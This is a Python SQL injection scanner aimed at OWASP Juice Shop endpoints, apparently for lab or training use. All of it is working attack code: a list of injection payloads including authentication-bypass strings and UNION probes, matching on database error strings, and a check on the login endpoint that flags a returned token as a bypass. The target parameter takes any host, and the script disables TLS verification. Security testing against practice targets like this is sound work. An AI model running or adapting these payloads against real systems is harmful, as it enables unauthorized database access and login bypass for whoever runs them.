import requests
import urllib3
urllib3.disable_warnings()

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "admin'--",
    "' AND 1=1--",
    "' AND 1=2--",
]

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax",
    "mysql_fetch",
    "sqlite_",
    "ora-",
    "syntax error",
    "sequelize",
    "sqlite",
    "SQLITE_ERROR",
    "near \"'\"",
    "unrecognized token",
]

JUICE_SHOP_ENDPOINTS = [
    "/rest/products/search?q=",
    "/rest/user/login",
    "/api/Products?q=",
]

def test_get(base_url, endpoint, payload):
    url = f"{base_url}{endpoint}{requests.utils.quote(payload)}"
    try:
        r = requests.get(url, timeout=5, verify=False)
        body = r.text.lower()
        for sig in ERROR_SIGNATURES:
            if sig.lower() in body:
                return {"url": url, "payload": payload, "signature": sig, "method": "GET"}
    except:
        pass
    return None

def test_post(base_url, endpoint, payload):
    url = f"{base_url}{endpoint}"
    data = {"email": payload, "password": payload}
    try:
        r = requests.post(url, json=data, timeout=5, verify=False)
        body = r.text.lower()
        for sig in ERROR_SIGNATURES:
            if sig.lower() in body:
                return {"url": url, "payload": payload, "signature": sig, "method": "POST"}
        # Juice Shop login bypass check
        if r.status_code == 200 and "token" in r.text:
            return {"url": url, "payload": payload, "signature": "Auth bypass - token returned", "method": "POST"}
    except:
        pass
    return None

def run(target):
    if not target.startswith("http"):
        target = "http://" + target

    target = target.rstrip("/")

    print(f"    [*] Target: {target}")
    print(f"    [*] Testing {len(SQLI_PAYLOADS)} payloads on {len(JUICE_SHOP_ENDPOINTS)} endpoints...\n")

    found = []

    for endpoint in JUICE_SHOP_ENDPOINTS:
        for payload in SQLI_PAYLOADS:
            if "login" in endpoint:
                result = test_post(target, endpoint, payload)
            else:
                result = test_get(target, endpoint, payload)

            if result:
                print(f"    \033[92m[+] SQLi Found!\033[0m")
                print(f"        Method: {result['method']}")
                print(f"        URL: {result['url']}")
                print(f"        Payload: {result['payload']}")
                print(f"        Signature: {result['signature']}\n")
                found.append(result)

    if not found:
        print("    [-] No SQLi vulnerabilities detected")

    return found
